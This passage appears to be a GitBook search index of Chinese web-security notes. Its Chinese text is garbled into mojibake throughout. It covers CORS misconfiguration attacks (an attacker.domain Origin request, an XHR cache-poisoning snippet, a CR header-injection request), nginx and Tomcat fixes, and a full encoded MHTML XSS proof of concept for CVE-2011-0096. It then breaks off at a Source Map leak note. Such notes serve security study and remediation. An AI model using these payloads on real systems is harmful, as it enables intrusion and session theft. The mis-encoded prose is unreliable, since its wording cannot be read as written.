æ”»å‡»è€…æŒæ¡çš„åŸŸå çœŸçš„ æ˜¯ * çœŸçš„ å¦ æµè§ˆå™¨æŠ¥é”™ nullï¼ˆç©ºå€¼ï¼‰ çœŸçš„ æ˜¯ ä»»æ„ç½‘ç«™ä½¿ç”¨æ²™ç›’ iframe æ¥è·å– null æº æœç‹è§†é¢‘ CORS è¯¯é…ç½®æ¼æ´æ¼”ç¤ºï¼šhttps://www.youtube.com/watch?v=PWbPbtyyNi8 æ–¹å¼äºŒï¼šä¸å­˜åœ¨ç”¨æˆ·å‡­è¯ Access-Control-Allow-Origin æ˜¯å¦å¯åˆ©ç”¨ æ”»å‡»è€…æŒæ¡çš„åŸŸå æ˜¯ nullï¼ˆç©ºå€¼ï¼‰ æ˜¯ * æ˜¯ ç»•è¿‡åŸºäº IP çš„è®¤è¯ å¦‚æœç›®æ ‡åº”ç”¨ç¨‹åºä¸å—å®³è€…çš„ç½‘ç»œå¯è¾¾æ€§ï¼Œå¹¶ä¸”ç›®æ ‡åº”ç”¨ç¨‹åºä½¿ç”¨ IP åœ°å€ä½œä¸ºèº«ä»½éªŒè¯çš„æ–¹å¼ï¼Œåˆ™é»‘å®¢ä¼šåˆ©ç”¨å—å®³è€…çš„æµè§ˆå™¨ä½œä¸ºä»£ç†å»è®¿é—®é‚£äº›ç›®æ ‡åº”ç”¨ç¨‹åºå¹¶ä¸”å¯ä»¥ç»•è¿‡é‚£äº›åŸºäº IP çš„èº«ä»½éªŒè¯ã€‚ å®¢æˆ·ç«¯ç¼“å­˜ä¸­æ¯’ ä¾‹å¦‚ï¼Œæ•°æ®æŠ¥æ–‡å¤´éƒ¨ä¸­åŒ…å« X-User æ ‡å¤´ï¼Œå…¶å€¼æœªè¿›è¡Œä»»ä½•è¾“å…¥éªŒè¯ï¼Œè¾“å‡ºç¼–ç ã€‚ è¯·æ±‚åŒ… GET /login HTTP/1.1 Host: www.target.local Origin: https://attacker.domain/ X-User: å“åº”åŒ… Access-Control-Allow-Origin å·²è¢«è®¾ç½®ï¼ŒAccess-Control-Allow-Credentials: true ä¸ Vary: Origin å¤´å·²ç»è®¾ç½®ã€‚ HTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.domain/ â€¦ Content-Type: text/html â€¦ Invalid user: æ„é€ å­˜åœ¨æ¶æ„çš„ XSS æœ‰æ•ˆè´Ÿè½½é¡µé¢ï¼Œè¯±ä½¿å—å®³è€…è§¦å‘ã€‚ var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','http://www.target.local/login',true); req.setRequestHeader('X-User', ''); req.send(); function reqListener() { location='http://www.target.local/login'; } æœåŠ¡å™¨ç«¯ç¼“å­˜ä¸­æ¯’ åˆ©ç”¨ CORS çš„é”™è¯¯é…ç½®æ³¨å…¥ä»»æ„ HTTP å¤´éƒ¨ï¼Œå°†å…¶ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ç¼“å­˜ä¸­ï¼Œå¯ç”¨äºæ„é€ å­˜å‚¨ç±»å‹ XSSã€‚ åˆ©ç”¨æ¡ä»¶ï¼šå­˜åœ¨æœåŠ¡å™¨ç«¯ç¼“å­˜ï¼Œèƒ½å¤Ÿåå°„ Origin å¤´éƒ¨ï¼Œä¸ä¼šæ£€æŸ¥ Origin å¤´éƒ¨ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚ \\r åˆ©ç”¨æ–¹å¼ï¼šæ”»å‡» IE / Edge ç”¨æˆ·ï¼ˆIE / Edge ä½¿ç”¨ \\r ä½œä¸ºçš„ HTTP æ ‡é¢˜æ®µçš„ç»ˆç»“ç¬¦ï¼‰ è¯·æ±‚åŒ… GET / HTTP/1.1 Origin: z[0x0d]Content-Type: text/html; charset=UTF-7 å›è½¦ï¼ˆCRï¼‰ï¼šASCII ç ï¼š'\\r' ï¼Œåå…­è¿›åˆ¶ï¼š0x0d å“åº”åŒ… HTTP/1.1 200 OK Access-Control-Allow-Origin: z Content-Type: text/html; charset=UTF-7 å¦‚æœæ”»å‡»è€…èƒ½æå‰å‘é€ç•¸å½¢çš„ Origin æ¶ˆæ¯å¤´ï¼Œåˆ™åˆ©ç”¨ä»£ç†æˆ–å‘½ä»¤è¡Œçš„æ–¹å¼å‘é€ï¼Œåˆ™æœåŠ¡å™¨å°±ä¼šç¼“å­˜è¿™æ ·çš„è¿”å›æŠ¥æ–‡å¹¶ä½œç”¨äºå…¶ä»–ç”¨æˆ·ã€‚ä¸Šä¾‹ä¸­ï¼Œæ”»å‡»è€…å°†é¡µé¢çš„ç¼–ç è®¾ç½®ä¸º UTF-7ï¼Œå¯å¼•å‘ XSS ä¸­æ–­ã€‚ é…åˆ XSS åŠ«æŒä¼šè¯ åœ¨æ­£å¸¸çš„ç½‘é¡µè¢«åµŒå…¥äº†åˆ°æ”»å‡»è€…æ§åˆ¶é¡µé¢çš„è·¨åŸŸè¯·æ±‚ï¼Œä»è€ŒåŠ«æŒç”¨æˆ·çš„ä¼šè¯ã€‚ äº¤äº’å¼ xssã€‚é€šè¿‡ corsï¼Œç»•è¿‡ä¸€äº›åä¼šè¯åŠ«æŒçš„æ–¹æ³•ï¼Œå¦‚ HTTP-Only é™åˆ¶çš„ cookieï¼Œç»‘å®š IP åœ°å€çš„ä¼šè¯ ID ç­‰ï¼ŒåŠ«æŒç”¨æˆ·ä¼šè¯ã€‚ ç¨‹åºçŒ¿åœ¨å†™ ajax è¯·æ±‚çš„æ—¶å€™ï¼Œå¯¹ç›®æ ‡åŸŸé™åˆ¶ä¸ä¸¥ï¼Œæœ‰ç‚¹ç±»ä¼¼äº url è·³è½¬ã€‚ facebook å‡ºç°è¿‡è¿™æ ·ä¸€ä¸ªæ¡ˆä¾‹ï¼Œjavascript é€šè¿‡ url é‡Œçš„å‚æ•°è¿›è¡Œ ajax è¯·æ±‚ã€‚ â€‹ CORS ä¸ CSRF çš„åŒºåˆ« CORS æœºåˆ¶çš„ç›®çš„æ˜¯ä¸ºäº†è§£å†³è„šæœ¬çš„è·¨åŸŸèµ„æºè¯·æ±‚é—®é¢˜ï¼Œä¸æ˜¯ä¸ºäº†é˜²æ­¢ CSRFã€‚ CSRF ä¸€èˆ¬ä½¿ç”¨ form è¡¨å•æäº¤è¯·æ±‚ï¼Œè€Œæµè§ˆå™¨æ˜¯ä¸ä¼šå¯¹ form è¡¨å•è¿›è¡ŒåŒæºæ‹¦æˆªçš„ï¼Œå› ä¸ºè¿™æ˜¯æ— å“åº”çš„è¯·æ±‚ï¼Œæµè§ˆå™¨è®¤ä¸ºæ— å“åº”è¯·æ±‚æ˜¯å®‰å…¨çš„ã€‚ è„šæœ¬çš„è·¨åŸŸè¯·æ±‚åœ¨åŒæºç­–ç•¥çš„é™åˆ¶ä¸‹ï¼Œå“åº”ä¼šè¢«æ‹¦æˆªï¼Œå³é˜»æ­¢è·å–å“åº”ï¼Œä½†æ˜¯è¯·æ±‚è¿˜æ˜¯å‘é€åˆ°äº†åç«¯æœåŠ¡å™¨ã€‚ ç›¸åŒç‚¹ï¼šéƒ½éœ€è¦ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼›éƒ½éœ€è¦å€ŸåŠ© Ajax çš„å¼‚æ­¥åŠ è½½è¿‡ç¨‹ï¼›ä¸€èˆ¬éƒ½éœ€è¦ç”¨æˆ·ç™»å½•ç›®æ ‡ç«™ç‚¹ã€‚ ä¸åŒç‚¹ï¼šä¸€èˆ¬ CORS æ¼æ´ç”¨äºè¯»å–å—å®³è€…çš„æ•æ„Ÿä¿¡æ¯ï¼Œè·å–è¯·æ±‚å“åº”çš„å†…å®¹ï¼›è€Œ CSRF åˆ™æ˜¯è¯±ä½¿å—å®³è€…ç‚¹å‡»æäº¤è¡¨å•æ¥è¿›è¡ŒæŸäº›æ•æ„Ÿæ“ä½œï¼Œä¸ç”¨è·å–è¯·æ±‚å“åº”å†…å®¹ã€‚ 0x06 ä¿®å¤æ–¹æ³• ä¿®å¤æ–¹æ³•æ˜¯åˆç†é…ç½® CORSï¼Œåˆ¤æ–­ Origin æ˜¯å¦åˆæ³•ï¼›å…·ä½“è¯´å°±æ˜¯ä¸è®©åœ¨ nginx æˆ– tomcat ä¸­é…ç½®ã€Access-Control-Allow-Origin *â€‹â€‹â€‹â€‹â€‹ã€‘æˆ–ã€Access-Control-Allow-Origin nullâ€‹â€‹â€‹â€‹â€‹ã€‘ã€‚ å…³é—­éæ­£å¼å¼€å¯çš„ CORSï¼Œä¸è¦ä¿¡ä»»å…¨éƒ¨è‡ªèº«å­åŸŸï¼Œå‡å°‘æ”»å‡»é¢ ä¸è¦é…ç½® Access-Control-Allow-Originâ€‹â€‹â€‹ ä¸ºé€šé…ç¬¦ *â€‹â€‹â€‹ æˆ– nullâ€‹â€‹â€‹ï¼Œä¸¥æ ¼æ ¡éªŒæ¥è‡ªè¯·æ±‚æ•°æ®åŒ…ä¸­ Originâ€‹â€‹â€‹ çš„å€¼ å½»åº•çš„è¿”å› Vary: Originâ€‹â€‹â€‹ å³è¾¹ï¼Œçªç ´æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨ç¼“å­˜è¿›è¡Œæ”»å‡» ä»…åœ¨æ¥æ”¶åˆ°è·¨åŸŸè¯·æ±‚æ—¶æ‰é…ç½®æœ‰å…³äºè·¨åŸŸçš„å¤´éƒ¨ï¼Œå¹¶ç¡®ä¿è·¨åŸŸè¯·æ±‚æ˜¯åˆæ³•çš„æºï¼Œä»¥å‡å°‘æ”»å‡»è€…æ¶æ„åˆ©ç”¨çš„å¯èƒ½æ€§ HTTPS ç½‘ç«™ä¸è¦ä¿¡ä»» HTTP åŸŸ # å…è®¸è·¨åŸŸè¯·æ±‚çš„åŸŸï¼Œ* ä»£è¡¨æ‰€æœ‰ï¼›null å¯ä»¥ç”¨æ¥å’Œæœ¬åœ° file é¡µé¢å…±äº«æ•°æ® add_header 'Access-Control-Allow-Origin' *; # å…è®¸è¯·æ±‚çš„ header add_header 'Access-Control-Allow-Headers' *; # å…è®¸å¸¦ä¸Š cookie è¯·æ±‚ï¼Œä¸èƒ½å’Œå…è®¸è·¨åŸŸè¯·æ±‚çš„åŸŸ * ä¸€åŒä½¿ç”¨ï¼ŒOrigin éœ€è¦æ˜ç¡®çš„é…ç½®å…è®¸æ¥æºçš„åŸŸã€‚å› ä¸º * è¿™ç§é…ç½®åªèƒ½ç”¨äºå…±äº«å…¬å¼€èµ„æºï¼Œå¯¹äºå…±äº«å…¬å¼€èµ„æºï¼Œä¸åº”è¯¥éœ€è¦èº«ä»½è®¤è¯ã€‚ add_header 'Access-Control-Allow-Credentials' 'true'; # å…è®¸è¯·æ±‚çš„æ–¹æ³•ï¼Œæ¯”å¦‚ GET,POST,PUT,DELETE add_header 'Access-Control-Allow-Methods' *; ä¿®æ”¹ Nginx é…ç½®æ–‡ä»¶ æ–¹æ³•ä¸€ï¼šä½¿ç”¨é€šé…ç¬¦ *â€‹â€‹ location / { add_header Access-Control-Allow-Origin *.xxx.com; add_header Access-Control-Allow-Headers \"Originï¼Œ X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } æ–¹æ³•äºŒï¼šæŒ‡å®šåŸŸåç™½åå• æ ¹æ®é”™è¯¯é…ç½®ç±»å‹ï¼Œè¯¥æ–¹æ³•æœ‰å¾…ç¡®è®¤ã€‚ # ä½¿ç”¨åŸŸå location / { add_header Access-Control-Allow-Origin http://www.xixixi123.com; add_header Access-Control-Allow-Headers \"Originï¼Œ X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } # æŒ‡å®š ip ä¸ç«¯å£ï¼Œå¯ä»¥é€—å·æ‹¼æ¥ location / { add_header Access-Control-Allow-Origin http://10.130.222.222:6500,http://10.130.222.223:6500; add_header Access-Control-Allow-Headers \"Originï¼Œ X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } æ–¹æ³•ä¸‰ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ location ~ /myurl(.*) { if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.222):6500$' { add_header Access-Control-Allow-Origin $http_origin; } if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.223):6500$' { add_header Access-Control-Allow-Origin $http_origin; } add_header Access-Control-Allow-Headers \"Originï¼Œ X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } è¯´æ˜ â€‹$ http_originâ€‹â€‹ å¯ä»¥è·å–åˆ°è¯·æ±‚å¤´ä¸­çš„ Origin å­—æ®µï¼›ä½†æ˜¯å¦‚æœè¯·æ±‚å¤´æ²¡æœ‰ï¼Œå°±è·å–ä¸åˆ°äº†ï¼› â€‹^â€‹â€‹ æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºå¼€å¤´ä½ç½®ï¼›$â€‹â€‹ æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºç»“å°¾ä½ç½® â€‹?â€‹â€‹ æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤º s å¯èƒ½æœ‰ï¼Œä¹Ÿå¯èƒ½æ²¡æœ‰ï¼Œè¿™ä¸¤ç§æƒ…å†µéƒ½å¯ä»¥åŒ¹é… .â€‹â€‹â€‹ æ˜¯æŠŠ .â€‹â€‹ è½¬ä¹‰æˆæ™®é€šå­—ç¬¦çš„æ„æ€ nginx ä¸­ï¼Œif åå¿…é¡»åŠ ç©ºæ ¼ï¼Œç„¶åæ‰èƒ½å†™ (â€‹â€‹ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼›nginx ä¸­ï¼Œæ²¡æœ‰ else if nginx è§£å†³å¤æ‚è¯·æ±‚è·¨åŸŸçš„æ—¶å€™éœ€åŠ ä¸Š aways å‚æ•°egï¼šadd_header 'Access-Control-Allow-Origin' \"$http_origin\" always;â€‹â€‹ åŸå› ï¼šAs of Nginx 1.7.5, add_header supports an \"always\" parameter whichâ€‹allows CORS to work if the backend returns 4xx or 5xx status code.â€‹â€‹å‚è€ƒèµ„æ–™ï¼šhttps://gist.github.com/Stanback/7145487 ç™½åå•é…ç½®ç¤ºä¾‹ Tomcat è¿‡æ»¤è·¯ç”± package filter; import java.io.IOException; import java.io.UnsupportedEncodingException; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; import java.util.Arrays; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.ws.http.HTTPException; @WebFilter(\"/Cors\") public class CorsFilter implements Filter { /** * Default constructor. */ public FilterConfig config; public CorsFilter() { // TODO Auto-generated constructor stub } /** * @see Filter#destroy() */ public void destroy() { // TODO Auto-generated method stub this.config = null; } /** * @see Filter#doFilter(ServletRequest, ServletResponse, FilterChain) */ public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { //é…ç½®å¯ä¿¡åŸŸå String[] authhosts = {\"http://www.abc.com:8008\", \"http://www.abcyy.com\"}; String authost = \"\"; HttpServletRequest httprequest = (HttpServletRequest) request; String origin = httprequest.getHeader(\"origin\"); HttpServletResponse httpresponse = (HttpServletResponse) response; if (origin != null && !Arrays.asList(authhosts).contains(origin)) { httpresponse.sendError(403); return; } else { for (int i = 0; i å¦ä¸€ç§é…ç½®æ–¹å¼ æŠŠ cors-filter-1.7.jar ä¸ java-property-utils-1.9.jar è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ° tomcat çš„ lib ç›®å½•ä¸‹ åœ¨ tomcat çš„ web.xml ä¸­é…ç½® CORS com.thetransactioncompany.cors.CORSFilter cors.allowOrigin * --> *.xxx.com,http://10.130.222.222:6500 cors.exposedHeaders Set-Cookie cors.supportsCredentials true CORS /* 0x07 ä¼˜ç§€æ¡ˆä¾‹ ç»„åˆæ¼æ´å¯¼è‡´çš„è´¦å·åŠ«æŒ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) https://www.someattack.com/Playground/About é¸¡è‚‹ CSRF å’Œ Self-XSS ç»„åˆçš„å˜åºŸä¸ºå® - FreeBuf ç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· 0x00 å‰äººæ ½æ ‘ è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£ - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿— (ruanyifeng.com) -- å¯ä»¥é¡ºä¾¿çœ‹çœ‹è¯„è®º ç»•è¿‡æµè§ˆå™¨ SOPï¼Œè·¨ç«™çªƒå–ä¿¡æ¯ï¼šCORS é…ç½®å®‰å…¨æ¼æ´æŠ¥å‘ŠåŠæœ€ä½³éƒ¨ç½²å®è·µ | Jianjun Chen | International Computer Science Institute | Network Security -- æ¨èé˜…è¯» https://web.dev/cross-origin-resource-sharing/ https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS CVE-2018-8014ï¼Œhttps://nvd.nist.gov/vuln/detail/CVE-2018-8014 nginx - å‰ç«¯å¸¸è§è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼ˆå…¨ï¼‰ - ä¸ªäººæ–‡ç«  - SegmentFault æ€å¦ CORS ä»‹ç»åŠå…¶æ¼æ´æ£€æµ‹ - çŸ¥ä¹ (zhihu.com) CORS è·¨åŸŸæ¼æ´ä¿®å¤ - ä¸æ„¿é€éœ²å§“åçš„æ±¤å§†çŒ« - åšå®¢å›­ (cnblogs.com) (82 æ¡æ¶ˆæ¯) CORS(è·¨åŸŸèµ„æºå…±äº«)æ¼æ´è§£å†³æ–¹æ³•cors æ¼æ´ä¿®å¤è¿½é€æ¢¦æƒ³æ°¸ä¸åœçš„åšå®¢-CSDN åšå®¢ -- æµ‹è¯•æ–¹æ³•è¯´æ˜æœ‰è¯¯ ã€æ¼æ´åˆ©ç”¨ã€‘è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰æ¼æ´è¯¦è§£ - GorillaLee - åšå®¢å›­ (cnblogs.com) CORS å®Œå…¨æ‰‹å†Šï¼ˆä¸€ï¼‰ï¼šç‚ºä»€éº¼æœƒç™¼ç”Ÿ CORS éŒ¯èª¤ï¼Ÿ Â· Issue #68 Â· aszx87410/blog Â· GitHub (82 æ¡æ¶ˆæ¯) Nginx è·¨åŸŸé…ç½®_ç¨‹åºå‘˜å°å¼ºçš„åšå®¢-CSDN åšå®¢ https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-27 17:33:25 "},"web/Microsoft Windows MHTMLè„šæœ¬ä»£ç æ³¨å…¥æ¼æ´.html":{"url":"web/Microsoft Windows MHTMLè„šæœ¬ä»£ç æ³¨å…¥æ¼æ´.html","title":"Microsoft Windows MHTMLè„šæœ¬ä»£ç æ³¨å…¥æ¼æ´","keywords":"","body":"0x01 æ¼æ´æè¿° CVE-2011-0096 The MHTML protocol handler in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, R2, and R2 SP1, and Windows 7 Gold and SP1 does not properly handle a MIME format in a request for content blocks in a document, which allows remote attackers to conduct cross-site scripting (XSS) attacks via a crafted web site that is visited in Internet Explorer, aka \"MHTML Mime-Formatted Request Vulnerability.\" Windows XP SP2 å’Œ SP3ã€ Windows Server 2003 SP2ã€ Windows Vista SP1 å’Œ SP2ã€ Windows Server 2008 Goldã€ SP2ã€ R2 å’Œ R2 SP1 ä»¥åŠ Windows 7 Gold å’Œ SP1 ä¸­çš„ MHTML åè®®å¤„ç†ç¨‹åºä¸èƒ½æ­£ç¡®å¤„ç†æ–‡æ¡£å†…å®¹å—è¯·æ±‚ä¸­çš„ MIME æ ¼å¼ï¼Œè¿™ä½¿å¾—è¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸€ä¸ªç²¾å¿ƒè®¾è®¡çš„ç½‘ç«™è¿›è¡Œè·¨ç½‘ç«™è„šæœ¬(XSS)æ”»å‡»ï¼Œè¿™ä¸ªç½‘ç«™è¢«ç§°ä¸ºâ€œ MHTML MIME-Formatted Request Vulnerabilityâ€ï¼ŒInternet Explorer è®¿é—®ã€‚ MHTMLï¼Œå³ MIME HTMLï¼Œæ˜¯ç”± RFC 2557 å®šä¹‰çš„ï¼ŒæŠŠä¸€ä¸ªå¤šé™„ä»¶ï¼ˆå¦‚å›¾ç‰‡ï¼Œflash åŠ¨ç”»ç­‰ï¼‰çš„ç½‘é¡µå†…å®¹éƒ½ä¿å­˜åˆ°å•ä¸€æ¡£æ¡ˆçš„æ ‡å‡†ã€‚è¿™ä¸ªæ ‡å‡†ç”±å¾®è½¯æå‡ºï¼Œå¹¶ä» IE 5.0 å¯¹å…¶å¼€å§‹æ”¯æŒã€‚ åŒæ—¶ï¼Œå¾®è½¯å®ç°äº† MHTML åè®®ï¼Œé»˜è®¤å®‰è£…çš„ window ç³»ç»Ÿéƒ½å¸¦æœ‰ MHTML åè®®å¤„ç†ç¨‹åºï¼ˆMHTMLProtocol Handlerï¼‰ã€‚åœ¨ IE ä¸­ï¼Œå½“åµŒå…¥èµ„æºçš„ URL çš„åè®®ä¸º MHTML æ—¶ï¼ŒIE å°†è°ƒç”¨ MHTML ProtocolHandlerï¼ŒæŠŠè¯¥èµ„æºå½“ä½œ MHTML æ ¼å¼æ–‡ä»¶è§£æå¤„ç†ã€‚ MHTML Protocol Handler è§£æ MHTML æ ¼å¼æ–‡ä»¶ï¼Œå…¶ç»“æœäº¤ç»™ IE æ¸²æŸ“ï¼Œä¸å¯é¿å…çš„å°†æ¶‰åŠè·¨åŸŸã€è„šæœ¬è®¿é—®æƒé™ç­‰å®‰å…¨é—®é¢˜ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼ŒIE ä¸€æ—¦å¤„ç†ä¸å½“ï¼Œåˆ™ä¼šäº§ç”Ÿè·¨åŸŸæ¼æ´ã€‚ 0x02 POC & EXP ç¯å¢ƒä¿¡æ¯ // SystemInfo ä¸»æœºå: WINXPIE6 OS åç§°: Microsoft Windows XP Professional OS ç‰ˆæœ¬: 5.1.2600 Service Pack 3 Build 2600 ä¿®è¡¥ç¨‹åº: å®‰è£…äº† 1 ä¸ªä¿®è¡¥ç¨‹åºã€‚ [01]: Q147222 // IEInfo ç‰ˆæœ¬ï¼š6.0.2900.5512.xpsp.080413-2111 æ›´æ–°ç‰ˆæœ¬ï¼šSP3 é—®é¢˜å‚æ•°ï¼šlocale urlï¼šmhtml:http://x.x.x.x/cm/help/dialog.jsp?locale=zh_CN â€‹â€‹ åˆ©ç”¨æ¡ä»¶ ï¼ˆ1ï¼‰æœåŠ¡å™¨å¯¹ç”¨æˆ·æäº¤çš„å‚æ•°æœªè¿›è¡Œè¿‡æ»¤å¹¶åœ¨ HTML ä¸­è¿”å›ï¼› ï¼ˆ2ï¼‰ç”¨æˆ·ä½¿ç”¨å­˜åœ¨ MS11-026 æ¼æ´çš„ IE æµè§ˆå™¨ï¼› ï¼ˆ3ï¼‰ä½¿ç”¨ Win7 IE8 å¹¶æœªå¤ç°æˆåŠŸï¼Œåªæœ‰åœ¨æœ€å¤è€çš„ WinXP IE6 å¤ç°æˆåŠŸï¼ŒåŸºæœ¬æ— åˆ©ç”¨ä»·å€¼ã€‚ payload ï¼ˆ1ï¼‰è¿›è¡Œ URLencode ç¼–ç  ï¼ˆ2ï¼‰å°† %0Aâ€‹ æ›¿æ¢ä¸º %0D%0Aâ€‹ ï¼ˆ3ï¼‰å°† %â€‹ å·è¿›è¡ŒäºŒæ¬¡ url ç¼–ç å˜ä¸º %25â€‹ ï¼ˆ4ï¼‰å°†è„šæœ¬è¿›è¡Œ base64 ç¼–ç ã€‚å¦‚ PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=â€‹ æ˜¯ alert(\"XSS\")â€‹ // æœ¬åœ°ç¯å¢ƒ mhtml:http://172.16.10.244/coremail/help/dialog.jsp?locale=zh_CN----%250D%250AContent-Type%253A%2520multipart%252Frelated%253B%2520boundary%253D_webscan_atestu%250D%250A%250D%250A--_webscan_atestu%250D%250AContent-Location%253Acookie%250D%250AContent-Transfer-Encoding%253Abase64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgibW9iIik8L3NjcmlwdD4%253D%250D%250A--_webscan_atestu--%250D%250A%250D%250A!cookie // è¿˜åŸ mhtml:http://172.16.10.244/coremail/help/dialog.jsp?locale=zh_CN----%0AContent-Type%3A%20multipart%2Frelated%3B%20boundary%3D_webscan_atestu%0A%0A--_webscan_atestu%0AContent-Location%3Acookie%0AContent-Transfer-Encoding%3Abase64%0A%0APHNjcmlwdD5hbGVydCgibW9iIik8L3NjcmlwdD4%3D%0A--_webscan_atestu--%0A%0A!cookie // url è§£ç å mhtml:http://172.16.10.244/coremail/help/dialog.jsp?locale=zh_CN---- Content-Type: multipart/related; boundary=_webscan_atestu --_webscan_atestu Content-Location:cookie Content-Transfer-Encoding:base64 PHNjcmlwdD5hbGVydCgibW9iIik8L3NjcmlwdD4= --_webscan_atestu-- !cookie éœ€è¦æ³¨æ„ä¸€ä¸‹è¿™ä¸ª Content-Location:cookie è¦å’Œåé¢çš„ !cookie ä¸€è‡´ã€‚ ã€æ³¨ã€‘MHTML åè®®ï¼Œå¯ä»¥ä½¿ç”¨ Content-Type: text/html;â€‹ æ¥æ ‡è¯†æ–‡æ¡£çš„ MIME ç±»å‹ã€‚ ä¸Šé¢çš„ payload æ²¡æœ‰æ ‡æ˜ä¹Ÿèƒ½æ­£å¸¸æ‰§è¡Œï¼ŒåŠ ä¸Šä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ mhtml:http://172.16.10.244/coremail/help/dialog.jsp?locale=zh_CN----%250D%250AContent-Type%253A%2520multipart%252Frelated%253B%2520boundary%253D_webscan_atestu%250D%250A%250D%250A--_webscan_atestu%250D%250AContent-Type%253A%2520text%252fhtml%253B%250D%250AContent-Location%253Acookie%250D%250AContent-Transfer-Encoding%253Abase64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgibW9iIik8L3NjcmlwdD4%253D%250D%250A--_webscan_atestu--%250D%250A%250D%250A!cookie â€‹â€‹ â€‹ EXP è¯¦è§ï¼šMicrosoft Internet Explorer - MHTML Protocol Handler Cross-Site Scripting - Windows local Exploit (exploit-db.com) 0x03 ä¿®å¤æ–¹æ³• ï¼ˆ1ï¼‰æœåŠ¡å™¨ç«¯è¿‡æ»¤å‚æ•°ä¸­çš„å›è½¦æ¢è¡Œï¼ˆ%0d%0aâ€‹ï¼‰ï¼Œä½¿ä¹‹æ— æ³•æ»¡è¶³ MTHML åè®®çš„æ ¼å¼è¦æ±‚ã€‚ ï¼ˆ2ï¼‰å¯¹å‚æ•°çš„é•¿åº¦è¿›è¡Œé™åˆ¶ã€‚å› ä¸º MHTML æœ‰å›ºå®šçš„æ ¼å¼ï¼Œåªæœ‰é•¿åº¦æ»¡è¶³ï¼Œæ‰èƒ½æ„é€ è¿™æ ·çš„æ¡ä»¶ã€‚ 0x03 å‰äººæ ½æ ‘ [é˜¿å‘†]: è®°ä¸€æ¬¡ MHTML è·¨ç«™è„šæœ¬ç¼–åˆ¶æ¼æ´éªŒè¯ (antgroup-inc.com) -- å¥½æ–‡ IE ä¸‹ MHTML åè®®å¸¦æ¥çš„è·¨åŸŸå±å®³ (seebug.org) -- å¥½æ–‡ CVE - CVE-2011-0096 (mitre.org) Microsoft Security Bulletin MS11-026 - Important | Microsoft Learn â€ â€ â€ â€ â€‹â€‹ â€‹â€‹ Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-07-07 23:40:20 "},"web/Source Map æ³„éœ².html":{"url":"web/Source Map æ³„éœ².html","title":"Source Map æ³„éœ²","keywords":"","body":"0x01 æ¼æ´æè¿° æ¦‚è¿° Webpack æ˜¯ä¸€ä¸ª JavaScript åº”ç”¨ç¨‹åºçš„é™æ€èµ„æºæ‰“åŒ…å™¨ï¼ˆmodule bundlerï¼‰ã€‚å®ƒä¼šåœ¨å†…éƒ¨ä»ä¸€ä¸ªæˆ–å¤šä¸ªå…¥å£ç‚¹æ„å»ºä¸€ä¸ª ä¾èµ–å›¾(dependency graph)ï¼Œå…¶ä¸­åŒ…å«åº”ç”¨ç¨‹åºéœ€è¦çš„æ¯ä¸ªæ¨¡å—ï¼Œç„¶åå°†æ‰€æœ‰è¿™äº›æ¨¡å—æ‰“åŒ…æˆä¸€ä¸ªæˆ–å¤šä¸ª bundleï¼Œå®ƒä»¬å‡ä¸ºé™æ€èµ„æºï¼Œç”¨äºå±•ç¤ºä½ çš„å†…å®¹ã€‚ å®˜æ–¹æ–‡æ¡£ï¼šhttps://webpack.docschina.org/concepts/ã€‚å½“ç„¶æˆ‘ä»¬ä¸»è¦ä¸æ˜¯å­¦ä¹  webpackï¼ŒçŸ¥é“å®ƒæ˜¯ä»€ä¹ˆå°±å¯ä»¥äº†ï¼Œåç»­æœ‰å¼€å‘è¦æ±‚å†å»è¯»æ–‡æ¡£å§ã€‚ æ­£å¸¸æ¥è®²å‰ç«¯ä»£ç æ ¹æœ¬ä¸å­˜åœ¨ä»€ä¹ˆæ³„éœ²ä¸€è¯´ï¼Œå› 